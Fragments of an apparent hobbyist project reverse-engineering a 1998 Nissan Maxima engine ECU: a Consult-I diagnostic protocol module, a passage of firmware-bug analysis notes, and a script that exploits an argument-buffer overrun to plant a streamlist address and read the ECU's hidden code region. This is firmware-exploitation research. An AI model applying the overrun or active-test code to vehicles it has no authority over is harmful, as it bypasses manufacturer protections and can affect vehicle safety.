1	"""Consult-I protocol layer (CONSULT_PROTOCOL.md §3–4).
2	
3	Read-side commands plus active tests (0A, CONSULT_PROTOCOL.md §7). DTC clear (C1) is
4	still left out on purpose.
5	"""
6	import time
7	
8	ENGINE = 0xEF
9	ENGINE_ALT = 0xED               # the 1998 Maxima's engine ECU answers ED (reply 12), not EF
10	ENGINE_IDS = (ENGINE_ALT, ENGINE)
11	STOP = 0x30
12	GO = 0xF0
13	STOP_ACKS = (0xCF, 0xFE)        # both seen on the A32 (CONSULT_PROTOCOL.md §3, rule 7)
14	ACTIVE = 0x0A
15	
16	# Number of argument bytes that follow each command byte (echoed verbatim).
17	NARGS = {0x5A: 1, 0xC9: 2, 0x0A: 2}
18	
19	
20	class ConsultError(IOError):
21	    pass
22	
23	
24	def expected_echo(payload: bytes) -> bytes:
25	    out = bytearray()
26	    i = 0
27	    while i < len(payload):
28	        cmd = payload[i]
29	        n = NARGS.get(cmd, 0)
30	        out.append(~cmd & 0xFF)
31	        out += payload[i + 1:i + 1 + n]
32	        i += 1 + n
33	    return bytes(out)
34	
35	
36	class Consult:
37	    def __init__(self, transport):
38	        self.t = transport
39	
40	    def stop(self, timeout=2.0):
41	        """Send 30 and read until a stop ack. Returns (ack byte or None, bytes before it).
42	
43	        Whole frames are skipped by length, so a data byte that happens to be CF or FE
44	        isn't taken for the ack. Only whole frames come before the ack (checklist 1.5).
45	        """
46	        self.t.write(bytes([STOP]))
47	        self._frame_started = False
48	        before = bytearray()
49	        end = time.monotonic() + timeout
50	        while time.monotonic() < end:
51	            b = self.t.read(1, timeout=0.3)
52	            if not b:
53	                continue
54	            before += b
55	            if b[0] == 0xFF:
56	                n = self.t.read(1, timeout=0.3)
57	                before += n
58	                if n:
59	                    before += self.t.read(n[0], timeout=0.3)
60	                continue
61	            if b[0] in STOP_ACKS:
62	                return b[0], bytes(before[:-1])
63	        return None, bytes(before)
64	
65	    def init(self, ecu=ENGINE_IDS, tries=5, wait=2.0, pre_stop=True, gaps=(0.28, 0.07)):
66	        """Send FF FF <ecu> until ~ecu (10 for EF, 12 for ED) comes back.
67	
68	        `ecu` is one ID or a sequence of IDs tried in turn on each attempt. The
69	        default tries ED first and then EF: the 1998 Maxima answers ED. After a
70	        wrong-ID init the ECU ignores everything, including 30, until it gets a
71	        correct init.
72	
73	        `gaps` are the pauses after the first and second FF. ECUTalk 1.5.0 sends the
74	        three bytes separately with Sleep(Delay1=280 ms) and Sleep(Delay2=70 ms) in
75	        between (decompiled from ECUTalk). Pass gaps=None to send them back to back.
76	
77	        Returns (attempt number, seconds from TX to the reply, other bytes seen, id)
78	        on success, or None.
79	        """
80	        ids = (ecu,) if isinstance(ecu, int) else tuple(ecu)
81	        for n in range(tries * len(ids)):
82	            attempt, ecu = n // len(ids) + 1, ids[n % len(ids)]
83	            if pre_stop:
84	                self.stop(timeout=0.5)
85	                self.t.drain(quiet=0.2)
86	            if gaps:
87	                self.t.write(b"\xFF")
88	                time.sleep(gaps[0])
89	                self.t.write(b"\xFF")
90	                time.sleep(gaps[1])
91	                self.t.write(bytes([ecu]))
92	            else:
93	                self.t.write(bytes([0xFF, 0xFF, ecu]))
94	            sent = time.monotonic()
95	            junk = bytearray()
96	            while time.monotonic() - sent < wait:
97	                b = self.t.read(1, timeout=0.2)
98	                if not b:
99	                    continue
100	                if b[0] == 0xFF:
101	                    # A frame from a unit still streaming (the BCM keeps streaming
102	                    # after key-off, 2026-11-15): skip it by length, or its bytes
103	                    # can pass for the reply (FF 12 looked like an ED init).
104	                    n = self.t.read(1, timeout=0.2)
105	                    junk += b + n
106	                    if n:
107	                        junk += self.t.read(n[0], timeout=0.2)
108	                    continue
109	                if b[0] == ~ecu & 0xFF:
110	                    self.ecu = ecu
111	                    return attempt, time.monotonic() - sent, bytes(junk), ecu
112	                junk += b
113	        return None
114	
115	    def command(self, payload: bytes, retries=2):
116	        """Send a command list, check the echo, then send F0 to start streaming.
117	
118	        The 1998 Maxima (seen 2026-11-14) sometimes answers a valid command with FE FE
119	        in place of the first echo pair, and sometimes echoes it correctly but answers
120	        F0 with FE and sends no frames. Both are retried after a stop.
121	        """
122	        want = expected_echo(payload)
123	        why = ""
124	        for n in range(retries + 1):
125	            got = self._send(payload, want)
126	            if got == want:
127	                self.t.write(bytes([GO]))
128	                first = self.t.read(1, timeout=0.5)
129	                if first == b"\xFF":
130	                    self._frame_started = True   # read_frame: FF already consumed
131	                    return
132	                why = f"F0 answered with {first.hex() or '(none)'}"
133	            else:
134	                why = f"bad echo {got.hex(' ') or '(none)'}, expected {want.hex(' ')}"
135	            self.t.note(f"command try {n + 1} failed: {why}")
136	            self.stop(timeout=0.5)
137	            self.t.drain(quiet=0.1)
138	        raise ConsultError(why)
139	
140	    @property
141	    def paced(self):
142	        # The BCM (DA) answers FE to a command list sent in one burst, but accepts the
143	        # same bytes sent one at a time, each after its echo (2026-11-14).
144	        return getattr(self, "ecu", ENGINE) not in ENGINE_IDS
145	
146	    def _send(self, payload, want):
147	        if not self.paced:
148	            self.t.write(payload)
149	            return self.t.read(len(want), timeout=0.5)
150	        got = bytearray()
151	        for i, b in enumerate(payload):
152	            self.t.write(bytes([b]))
153	            e = self.t.read(1, timeout=0.3)
154	            got += e
155	            if e != want[i:i + 1]:
156	                break
157	        return bytes(got)
158	
159	    def read_frame(self, expected_len=None, timeout=1.0) -> bytes:
160	        """Read one FF <n> <data...> frame, parsing by length (data may contain FF)."""
161	        end = time.monotonic() + timeout
162	        while time.monotonic() < end:
163	            if getattr(self, "_frame_started", False):
164	                self._frame_started = False
165	            else:
166	                b = self.t.read(1, timeout=timeout)
167	                if not b:
168	                    break
169	                if b[0] != 0xFF:
170	                    continue
171	            n = self.t.read(1, timeout=0.3)
172	            if not n:
173	                break
174	            n = n[0]
175	            if expected_len is not None and n != expected_len:
176	                continue
177	            data = self.t.read(n, timeout=0.3)
178	            if len(data) == n:
179	                return data
180	        raise TimeoutError("no frame")
181	
182	    def one_shot(self, payload: bytes, expected_len=None) -> bytes:
183	        """Command, read a single frame, stop."""
184	        self.command(payload)
185	        try:
186	            return self.read_frame(expected_len)
187	        finally:
188	            self.stop()
189	
190	    def read_registers(self, regs):
191	        return b"".join(bytes([0x5A, r]) for r in regs)
192	
193	    def part_number(self):
194	        d = self.one_shot(bytes([0xD0]))
195	        pn = None
196	        tail = d[-5:]
197	        engine = getattr(self, "ecu", ENGINE) in ENGINE_IDS
198	        if len(d) >= 5 and all(0x30 <= b < 0x5B for b in tail):
199	            # 1998 Maxima: frame ending in ASCII, e.g. "2L904" = 23710-2L904. Only the
200	            # engine ECU is known to be 23710-; other units get the bare suffix.
201	            pn = ("23710-" if engine else "?-") + tail.decode("ascii")
202	        elif engine and len(d) >= 22:
203	            pn = f"{d[2]:02X}{d[3]:02X} 23710-{d[19]:X}{d[20]:02X}{d[21]:02X}"
204	        return d, pn
205	
206	    def read_memory(self, addrs):
207	        """C9: one byte from each address (1..8 per request, CONSULT_PROTOCOL.md §4)."""
208	        if not 1 <= len(addrs) <= 8:
209	            raise ValueError("C9 takes 1..8 addresses per request")
210	        payload = b"".join(bytes([0xC9, a >> 8, a & 0xFF]) for a in addrs)
211	        return self.one_shot(payload, expected_len=len(addrs))
212	
213	    def dtcs(self):
214	        d = self.one_shot(bytes([0xD1]))
215	        return d, [(d[i], d[i + 1]) for i in range(0, len(d) - 1, 2)]
216	
217	    def active_test(self, test, value, hold=5.0, on_rx=None):
218	        """Send 0A <test> <value> F0, hold for `hold` seconds, then stop (30).
219	
220	        No retries: a bad echo stops and raises. The stop is sent whatever happens,
221	        including Ctrl-C, and resent up to 3 times if it isn't acknowledged.
222	        `on_rx(bytes)` is called with whatever the ECU sends during the hold.
223	
224	        Returns (bytes received during the hold, stop ack or None).
225	        """
226	        payload = bytes([ACTIVE, test, value])
227	        want = expected_echo(payload)
228	        got = bytearray()
229	        try:
230	            echo = self._send(payload, want)    # paced for the BCM
231	            if echo != want:
232	                raise ConsultError(f"bad echo {echo.hex(' ') or '(none)'}, expected {want.hex(' ')}")
233	            self.t.write(bytes([GO]))
234	            self.t.note(f"active test {test:02X}={value:02X} on, holding {hold:.1f} s")
235	            end = time.monotonic() + hold
236	            while time.monotonic() < end:
237	                chunk = self.t.read(64, timeout=0.2)
238	                if chunk:
239	                    got += chunk
240	                    if on_rx:
241	                        on_rx(chunk)
242	        finally:
243	            ack = None
244	            for _ in range(3):
245	                ack, _ = self.stop()
246	                if ack is not None:
247	                    break
248	            self.t.note(f"active test {test:02X} stopped, ack {ack if ack is None else f'{ack:02X}'}")
249	        return bytes(got), ack
250

498	or a read of the `KNKT43J` H8.
499	
500	## 11. `0A` direct mode: a real bug and a more-permissive read path
501	
502	`0A` with a first byte `< $08` enters "direct mode" (the OBD Mode 6 / data-stream path,
503	§1), which loads `cs_streamlist` (`$07A0`) and then streams it back via
504	`consult_reply_direct` (`$9CDD`). Two findings here; neither leads anywhere today, but
505	the second is the most promising thread to pull if anything else turns up later.
506	
507	- **Bug: integer underflow / missing lower bound on the value byte** (`$5239`–`$531F`).
508	  For the "high" sub-paths (value `≥ $80`) the table offset is `(value − $80 − 1) × 4`.
509	  The per-branch check only bounds the top (e.g. `CMP #$84` at `L_5298`), so **`value =
510	  $80` is accepted and underflows**: `0 − 1 = $FF`, `× 4 = $3FC`, low byte `$FC`. The
511	  handler then reads two stream descriptors from `table_base + $FC`, far past the 16-byte
512	  table. Triggers: `0A <fb> 80` for `fb ∈ {0,2,5,6,7}`. `fb=0` self-rejects (the OOB
513	  words at `$EA6B` are `0000`); `fb=2/5/6/7` stream two bytes from fixed unintended ROM
514	  addresses (`$90F9`,`$A902` / `$5809`,`$2889` / `$42F8`,`$FF29` / `$0926`,`$8958`). The
515	  intended minimum was `value = $81` (offset 0). **No new access** — those are bank-0 ROM
516	  bytes `C9` already returns — but it is a genuine input-validation bug. Read-only and
517	  safe to poke on the car (direct mode writes no outputs); good for confirming the
518	  analysis.
519	- **`consult_reply_direct` has no bounds check and no forwarding.** It does `LDA
520	  $07A0,X; TAX; LDA $00,X` (`$9CF1`): it dereferences each `cs_streamlist` entry as a
521	  16-bit address and reads it **locally in data bank 0, with none of the `$5D40–$623F`
522	  forward / range logic that `consult_reply_c9` applies** (§1). So this path is more
523	  permissive than `C9`: an entry pointing into `$5D40–$623F` would read *this* CPU's
524	  hidden code there directly. It doesn't matter in practice, though — every reachable
525	  `cs_streamlist` value comes from fixed ROM (the descriptor tables `$E95F–$EA80`, or the
526	  fixed out-of-bounds bytes above), and scanning all of those tables found **no** entry in
527	  `$5D40–$623F`; there's no command that sets `cs_streamlist` to anything else. But it
528	  reframes the question: it's no longer "can the `C9` range check be gotten around" (there's
529	  none here to get around) but "**is there any way to write a chosen 16-bit value into
530	  `$07A0`**". None found — the active-test value write stops at `$079C`, the `cs_argbuf`
531	  overflow reaches only `$08FA` — so this stays a dead end, but it's the most promising
532	  remaining direction.
533	- **Swept — that write does not exist.** Checked every store in the ROM that targets
534	  `$07A0–$07A3`: there are exactly three (`$5224`, `$5327`, `$5331`), and all write
535	  fixed data — a descriptor-table pointer, or two 16-bit words read from ROM at
536	  `table_base + offset` (even the underflow source `table_base + $FC` is ROM, never the
537	  `$08xx` argument buffer). The only indexed write that could be *redirected* onto `$07A0`
538	  is the at_values store (`$519D`, dest `$076F + at_slot`); `at_slot` would have to reach
539	  `$31` (49) and it is written only at `$515F`, from the descriptor, maxing at 45 — and
540	  nowhere else in the image, so it can't be left stale high either. **Conclusion:
541	  `cs_streamlist` is unconditionally fixed-content; `consult_reply_direct`'s missing hole
542	  check cannot be aimed from the Consult interface.** Lead closed.
543	- **Exhaustively enumerated the entries, too.** For completeness (since `0A` can be fired
544	  any number of times), every accepted direct-mode `(first-byte, value)` was enumerated —
545	  71 configurations across the five dispatches, each producing two `cs_streamlist` words
546	  from its fixed `table_base + offset` (including the `value=$80` underflow to `+$FC`).
547	  **None of the 142 resulting addresses falls in `$5D40–$623F`.** Every one is low RAM/IO
548	  (`$03xx–$08xx`), low ROM (`$23xx–$25xx`), or fixed garbage (`$90F9`,`$5809`,`$42F8`,
549	  `$8958`) — all bank-0 and already `C9`-readable. Nearest misses: `fb=5 v=$80` → `$5809`
550	  (just below the hole) and `fb=6 v=$80` → `$FF29` (inside `$FE00–$FFCF`, already readable
551	  with `$1207.5` clear). So the engine cannot be handed a hole address, and since it is a
552	  single dereference (`mem[entry]`, not `mem[mem[entry]]`), no RAM cell we can write turns
553	  into a second hop. The hidden code at `$5D40–$623F` stays off-limits to software.

$60:\n      idx[$0E]=$61 → frame 0 stale ($60) → $07A1\n      idx[$10]=$60 → frame 2 H8 reply → $07A0\n      Streamlist = $60XX\n    \"\"\"\n    addr15 = 0x5E0F\n    addr16 = 0x5E0B\n    addr17 = 0x5E61  # idx[$0E] = $61\n    addr18 = 0x5E60  # c9_sub_value = $60, idx[$10] = $60\n    main_addr = 0x5E50  # safe lo=$50, avoids $60/$61\n\n    c9_addrs = [main_addr] * 15 + [addr15, addr16, addr17, addr18]\n    return bytes([0x0A, 0x02, 0x81]), c9_addrs\n\n\n# ---------------------------------------------------------------------------\n# Live execution\n# ---------------------------------------------------------------------------\n\ndef read_c9(c, addrs):\n    \"\"\"Read addresses via C9 one-shot (max 8 per call).\"\"\"\n    result = bytearray()\n    for i in range(0, len(addrs), 8):\n        chunk = addrs[i:i + 8]\n        result += c.read_memory(chunk)\n    return bytes(result)\n\n\ndef run_plant(c, payload, stop_frame, target_addr):\n    \"\"\"Phase 1: fire the 20-address overrun to plant cs_streamlist.\"\"\"\n    n_addrs = len(payload)\n    n_frames = stop_frame + 2  # a couple extra for safety\n\n    print(f\"\\n--- Phase 1: PLANT (target ${target_addr:04X}) ---\")\n    print(f\"  Sending {n_addrs} C9 addresses + F0...\")\n\n    cmd = b\"\".join(bytes([0xC9, a >> 8, a & 0xFF]) for a in payload)\n    c.command(cmd)\n    c.t.note(f\"plant sent: {n_addrs} addrs, target=${target_addr:04X}\")\n\n    frames = []\n    try:\n        for _ in range(n_frames):\n            f = c.read_frame(expected_len=n_addrs, timeout=1.0)\n            frames.append(f)\n    except TimeoutError:\n        pass\n\n    c.stop(timeout=0.5)\n    c.t.drain(quiet=0.05)\n    print(f\"  Streamed {len(frames)} frames, stopped.\")\n    return frames\n\n\ndef run_verify(c, target_addr):\n    \"\"\"Phase 2: read cs_streamlist via C9 to confirm the plant.\"\"\"\n    print(f\"\\n--- Phase 2: VERIFY ---\")\n    sl = read_c9(c, [CS_STREAMLIST, CS_STREAMLIST + 1,\n                      CS_STREAMLIST + 2, CS_STREAMLIST + 3])\n    word0 = sl[0] | (sl[1] << 8)\n    word1 = sl[2] | (sl[3] << 8)\n    print(f\"  cs_streamlist[0] = ${word0:04X}  (${sl[1]:02X} ${sl[0]:02X})\")\n    print(f\"  cs_streamlist[1] = ${word1:04X}  (${sl[3]:02X} ${sl[2]:02X})\")\n\n    if word0 == target_addr:\n        print(f\"  PLANT CONFIRMED: streamlist[0] = ${target_addr:04X}\")\n    else:\n        print(f\"  PLANT MISMATCH: expected ${target_addr:04X}, got ${word0:04X}\")\n\n    return word0, word1\n\n\ndef run_mixed(c, n_frames=12):\n    \"\"\"Phase 3: mixed 0A+C9 command — overrun + direct mode simultaneously.\"\"\"\n    print(f\"\\n--- Phase 3: MIXED READ (0A direct + C9 overrun) ---\")\n\n    oa_bytes, c9_addrs = build_mixed_payload()\n    n_c9 = len(c9_addrs)\n\n    # Build the full command payload: 0A 02 81 C9 xx xx ... (×19)\n    cmd = bytearray(oa_bytes)\n    for a in c9_addrs:\n        cmd += bytes([0xC9, a >> 8, a & 0xFF])\n    cmd = bytes(cmd)\n\n    print(f\"  Sending 0A 02 81 + {n_c9}×C9 + F0...\")\n    print(f\"  (0A activates direct mode; C9 overrun plants streamlist during streaming)\")\n\n    c.command(cmd)\n    c.t.note(f\"mixed cmd sent: 0A+{n_c9}xC9\")\n\n    frames = []\n    try:\n        for _ in range(n_frames):\n            f = c.read_frame(timeout=1.0)  # don't constrain length — unknown format\n            frames.append(f)\n    except TimeoutError:\n        pass\n\n    c.stop(timeout=0.5)\n    c.t.drain(quiet=0.05)\n\n    print(f\"  Streamed {len(frames)} frames.\")\n    print(f\"\\n  Raw frames:\")\n    for i, f in enumerate(frames):\n        hex_str = \" \".join(f\"{b:02X}\" for b in f)\n        print(f\"    [{i:2d}] len={len(f):2d}  {hex_str}\")\n\n    return frames\n\n\ndef run_direct_baseline(c, n_frames=4):\n    \"\"\"Baseline: run 0A direct mode alone to see its frame format.\"\"\"\n    print(f\"\\n--- Baseline: 0A direct mode alone ---\")\n    print(f\"  Sending 0A 02 81 + F0...\")\n\n    cmd = bytes([0x0A, 0x02, 0x81])\n    c.command(cmd)\n    c.t.note(\"baseline 0A direct\")\n\n    frames = []\n    try:\n        for _ in range(n_frames):\n            f = c.read_frame(timeout=1.0)\n            frames.append(f)\n    except TimeoutError:\n        pass\n\n    c.stop(timeout=0.5)\n    c.t.drain(quiet=0.05)\n\n    print(f\"  Streamed {len(frames)} frames.\")\n    for i, f in enumerate(frames):\n        hex_str = \" \".join(f\"{b:02X}\" for b in f)\n        print(f\"    [{i:2d}] len={len(f):2d}  {hex_str}\")\n\n    return frames\n\n\n# ---------------------------------------------------------------------------\n# Dry run\n# ---------------------------------------------------------------------------\n\ndef dry_run_plant(target_addr, h8_dump):\n    \"\"\"Simulate the plant and show what would happen.\"\"\"\n    target_hi = (target_addr >> 8) & 0xFF\n    target_lo = target_addr & 0xFF\n\n    result = build_plant_payload(target_hi, target_lo, h8_dump)\n    if result is None:\n        print(f\"  No payload found for ${target_addr:04X} with this H8 dump.\")\n        return False\n\n    payload, stop_frame = result\n\n    print(f\"  Target:     ${target_addr:04X} (hi=${target_hi:02X} lo=${target_lo:02X})\")\n    print(f\"  Main addr:  ${payload[0]:04X}\")\n    print(f\"  Payload:    15×${payload[0]:04X} + ${payload[15]:04X} ${payload[16]:04X} \"\n          f\"${payload[17]:04X} ${payload[18]:04X} ${payload[19]:04X}\")\n    print(f\"  Stop after: frame {stop_frame}\")\n\n    ram = simulate_overrun(payload)\n    writes = simulate_builder(dict(ram), h8_dump, stop_frame + 4)\n\n    print(f\"\\n  Reply builder writes:\")\n    for frame, target, value in writes:\n        lbl = \"\"\n        if target == CS_STREAMLIST:\n            lbl = \" ← streamlist[0] lo\"\n        elif target == CS_STREAMLIST + 1:\n            lbl = \" ← streamlist[0] hi\"\n        print(f\"    frame {frame:2d}: → ${target:04X} = ${value:02X}{lbl}\")\n\n    return True\n\n\ndef dry_run_sweep(h8_dump):\n    \"\"\"Show all achievable hidden-region addresses.\"\"\"\n    results = sweep_plant_targets(h8_dump)\n    if not results:\n        print(\"  No hidden-region addresses achievable with this H8 dump.\")\n        return\n\n    print(f\"  Achievable hidden-region addresses: {len(results)}\")\n    print()\n    pages = {}\n    for addr in sorted(results):\n        page = addr >> 8\n        pages.setdefault(page, []).append(addr)\n        main, a17, a18, a19, hi, lo, hf, lf, sf = results[addr]\n        print(f\"    ${addr:04X}  main=${main:04X}  \"\n              f\"hi=${hi:02X}@f{hf} lo=${lo:02X}@f{lf}  stop@f{sf}\")\n\n    print(f\"\\n  Coverage: {len(results)} / {FORWARD_HI - FORWARD_LO + 1} \"\n          f\"({100 * len(results) / (FORWARD_HI - FORWARD_LO + 1):.1f}%)\")\n    for page in sorted(pages):\n        print(f\"    ${page:02X}xx: {len(pages[page])} addrs\")\n\n\ndef dry_run_mixed():\n    \"\"\"Show the mixed command layout.\"\"\"\n    print(f\"\\n--- Mixed command (0A + C9 overrun) ---\")\n    oa_bytes, c9_addrs = build_mixed_payload()\n    print(f\"  0A args:    {oa_bytes.hex(' ')}\")\n    print(f\"  C9 addrs:   {len(c9_addrs)} (15×${c9_addrs[0]:04X} + \"\n          f\"${c9_addrs[15]:04X} ${c9_addrs[16]:04X} ${c9_addrs[17]:04X} ${c9_addrs[18]:04X})\")\n    print(f\"  Total args: 2 + {len(c9_addrs)*2} = {2 + len(c9_addrs)*2} bytes (limit 40)\")\n\n    # Simulate the overrun as the ECU would see it (0A args at argbuf[0..1])\n    all_pairs = [0x0281]  # 0A args as a 16-bit pair\n    all_pairs += c9_addrs\n    ram = simulate_overrun_mixed(all_pairs)\n    flags = ram.get(FWD_FLAGS, 0)\n    print(f\"  $07E3 = ${flags:02X}  bit0={'SET' if flags & 1 else 'CLR'}  \"\n          f\"bit1={'SET' if flags & 2 else 'CLR'}\")\n\n    n_final = ram.get(HIDDEN_N, 0)\n    cursor = ram.get(REPLY_CURSOR, 0)\n    print(f\"  n=${n_final:02X}  cursor=${cursor:02X}\")\n\n    idx_0e = ram.get(HIDDEN_IDX + 0x0E, 0)\n    idx_10 = ram.get(HIDDEN_IDX + 0x10, 0)\n    sub = ram.get(C9_SUB_VAL, 0)\n    print(f\"  idx[$0E]=${idx_0e:02X} → cs_payload[${idx_0e:02X}] = ${CS_PAYLOAD + idx_0e:04X}\")\n    print(f\"  idx[$10]=${idx_10:02X} → cs_payload[${idx_10:02X}] = ${CS_PAYLOAD + idx_10:04X}\")\n    print(f\"  c9_sub_value=${sub:02X} (stale byte for frame 0)\")\n    print()\n    print(f\"  Expected: frame 0 writes ${sub:02X} to ${CS_PAYLOAD + idx_0e:04X}\")\n    print(f\"            frame 2 writes H8 reply to ${CS_PAYLOAD + idx_10:04X}\")\n    if idx_0e == 0x61 and idx_10 == 0x60:\n        print(f\"            → streamlist[0] = ${sub:02X}XX (page ${sub:02X}, lo from H8)\")\n    elif idx_0e == 0x60 and idx_10 == 0x61:\n        print(f\"            → streamlist[0] = XX{sub:02X} (hi from H8, lo ${sub:02X})\")\n\n\ndef simulate_overrun_mixed(all_pairs):\n    \"\"\"Simulate c9_find_hidden with cs_argbuf containing 0A args + C9 addrs.\"\"\"\n    ram = {}\n    def rb(a): return ram.get(a, 0)\n    def wb(a, v): ram[a] = v & 0xFF\n    def rw(a): return rb(a) | (rb(a + 1) << 8)\n    def ww(a, v): wb(a, v & 0xFF); wb(a + 1, (v >> 8) & 0xFF)\n\n    cs_argc = len(all_pairs) * 2\n    for i, a in enumerate(all_pairs):\n        ww(0x08D2 + 2 * i, a)\n    wb(HIDDEN_N, 0)\n    wb(FWD_FLAGS, rb(FWD_FLAGS) & ~0x03)\n\n    for i in range(20):\n        if 2 * i >= cs_argc:\n            break\n        a_val = rw(0x08D2 + 2 * i)\n        if not (FORWARD_LO <= a_val < 0x6240):\n            if 2 * (i + 1) >= cs_argc:\n                break\n            continue\n        wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x01)\n        n = rb(HIDDEN_N)\n        addr_idx = (2 * n) & 0xFF\n        ww(HIDDEN_ADDR + addr_idx, a_val - 0x5000)\n        n_re = rw(HIDDEN_N) & 0xFF\n        wb(HIDDEN_IDX + n_re, i & 0xFF)\n        wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)\n        if 2 * (i + 1) >= cs_argc:\n            break\n    return ram\n\n\n# ---------------------------------------------------------------------------\n# Main\n# ---------------------------------------------------------------------------\n\ndef main():\n    ap = argparse.ArgumentParser(\n        description=__doc__,\n        formatter_class=argparse.RawDescriptionHelpFormatter)\n    ap.add_argument(\"--dev\", default=DEFAULT_DEV,\n                    help=f\"serial device (default: {DEFAULT_DEV})\")\n    ap.add_argument(\"--addr\", type=lambda x: int(x, 16), default=None,\n                    help=\"target hidden-region address in hex (default: auto from sweep)\")\n    ap.add_argument(\"--h8\", default=os.path.join(ROOT, \"h8_clean.bin\"),\n                    help=\"H8 dump for simulation (default: h8_clean.bin)\")\n    ap.add_argument(\"--sweep\", action=\"store_true\",\n                    help=\"show all achievable target addresses\")\n    ap.add_argument(\"--mixed-only\", action=\"store_true\",\n                    help=\"skip the plant+verify phases, run mixed command only\")\n    ap.add_argument(\"--frames\", type=int, default=12,\n                    help=\"frames to stream in mixed phase (default: 12)\")\n    ap.add_argument(\"--dry-run\", action=\"store_true\",\n                    help=\"simulate only, don't talk to the ECU\")\n    args = ap.parse_args()\n\n    print(\"c9_hidden_read: read main CPU hidden code via overrun + streamlist chain\")\n    print(\"Target ECU: 23710-2L904 (1998 Maxima VQ30DE)\")\n    print()\n\n    h8_dump = None\n    if os.path.exists(args.h8):\n        h8_dump = load_h8(args.h8)\n        print(f\"H8 dump: {args.h8} ({len(h8_dump)} bytes)\")\n    else:\n        print(f\"H8 dump not found: {args.h8}\")\n        print(\"  (needed for plant simulation — mixed command still works without it)\")\n\n    # --- Sweep ---\n    if args.sweep:\n        if h8_dump is None:\n            sys.exit(\"--sweep requires an H8 dump (--h8)\")\n        print()\n        dry_run_sweep(h8_dump)\n        print()\n        dry_run_mixed()\n        return\n\n    # --- Pick target ---\n    target_addr = args.addr\n    if target_addr is not None:\n        if not (FORWARD_LO <= target_addr <= FORWARD_HI):\n            sys.exit(f\"target ${target_addr:04X} outside hidden region \"\n                     f\"${FORWARD_LO:04X}–${FORWARD_HI:04X}\")\n    elif h8_dump is not None:\n        results = sweep_plant_targets(h8_dump)\n        if results:\n            target_addr = min(results.keys())\n            print(f\"Auto-selected target: ${target_addr:04X} \"\n                  f\"(first of {len(results)} achievable)\")\n        else:\n            print(\"No plant targets found; will run mixed command only.\")\n    else:\n        print(\"No H8 dump and no --addr; will run mixed command only.\")\n\n    # --- Dry run ---\n    if args.dry_run:\n        if target_addr is not None and h8_dump is not None:\n            print(f\"\\n--- Plant simulation for ${target_addr:04X} ---\")\n            dry_run_plant(target_addr, h8_dump)\n        dry_run_mixed()\n        return\n\n    # --- Live ---\n    os.makedirs(LOG_DIR, exist_ok=True)\n    log = os.path.join(LOG_DIR, f\"{datetime.date.today()}_hidden-read.log\")\n    t = Transport(args.dev, log)\n    t.note(\"c9_hidden_read start\")\n\n    try:\n        c = Consult(t)\n        c.ecu_ids = ENGINE_IDS\n\n        r = c.init()\n        if r is None:\n            sys.exit(\"init failed (ignition on?)\")\n        attempt, secs, junk, ecu = r\n        print(f\"\\ninit ok: id {ecu:02X}, attempt {attempt}, {secs * 1000:.0f} ms\")\n\n        # Baseline streamlist\n        sl_before = read_c9(c, [CS_STREAMLIST, CS_STREAMLIST + 1,\n                                 CS_STREAMLIST + 2, CS_STREAMLIST + 3])\n        print(f\"  streamlist before: {sl_before.hex(' ')}\")\n\n        if not args.mixed_only and target_addr is not None and h8_dump is not None:\n            # Phase 1: Plant\n            target_hi = (target_addr >> 8) & 0xFF\n            target_lo = target_addr & 0xFF\n            result = build_plant_payload(target_hi, target_lo, h8_dump)\n            if result is None:\n                print(f\"\\nNo payload for ${target_addr:04X} — skipping plant, going to mixed.\")\n            else:\n                payload, stop_frame = result\n                run_plant(c, payload, stop_frame, target_addr)\n\n                # Phase 2: Verify\n                word0, word1 = run_verify(c, target_addr)\n\n        # Phase 3: Baseline 0A\n        print()\n        c.init()\n        baseline = run_direct_baseline(c, 4)\n\n        # Phase 4: Mixed command\n        print()\n        c.init()\n        mixed = run_mixed(c, args.frames)\n\n        # Analysis\n        print(f\"\\n{'=' * 60}\")\n        print(\"ANALYSIS\")\n        print(f\"{'=' * 60}\")\n\n        if baseline and mixed:\n            bl = baseline[0] if baseline else b\"\"\n            mx = mixed[-1] if mixed else b\"\"\n            print(f\"\\n  Baseline 0A frame length: {len(bl)}\")\n            print(f\"  Mixed frame length:       {len(mx) if mx else '?'}\")\n\n            if len(mx) > len(bl):\n                extra = len(mx) - len(bl)\n                print(f\"  Extra bytes in mixed: {extra} (likely C9 hidden entries)\")\n                print(f\"\\n  If direct-mode bytes are at the START of the frame:\")\n                for i, f in enumerate(mixed):\n                    if len(f) >= len(bl):\n                        direct = f[:len(bl)]\n                        print(f\"    frame {i:2d}: direct={direct.hex(' ')}\")\n                print(f\"\\n  If direct-mode bytes are at the END:\")\n                for i, f in enumerate(mixed):\n                    if len(f) >= len(bl):\n                        direct = f[-len(bl):]\n                        print(f\"    frame {i:2d}: direct={direct.hex(' ')}\")\n            else:\n                print(f\"  Same length — direct and C9 might share slots or\"\n                      f\" only one builder ran.\")\n                print(f\"  Compare frame values:\")\n                for i, f in enumerate(mixed):\n                    bl_f = baseline[min(i, len(baseline) - 1)] if baseline else b\"\"\n                    diff = sum(1 for a, b in zip(f, bl_f) if a != b) if len(f) == len(bl_f) else -1\n                    print(f\"    frame {i:2d}: {f.hex(' ')}\"\n                          f\"{'  (' + str(diff) + ' bytes differ)' if diff >= 0 else ''}\")\n\n        print(f\"\\n  Check the log for raw bytes: {log}\")\n        print(f\"  Look for transition in direct-mode bytes after frame 2\")\n        print(f\"  (that's when the overrun finishes planting $07A0).\")\n\n    except (ConsultError, TimeoutError) as e:\n        print(f\"\\nerror: {e}\")\n    finally:\n        t.close()\n        print(f\"\\nlog: {log}\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
}

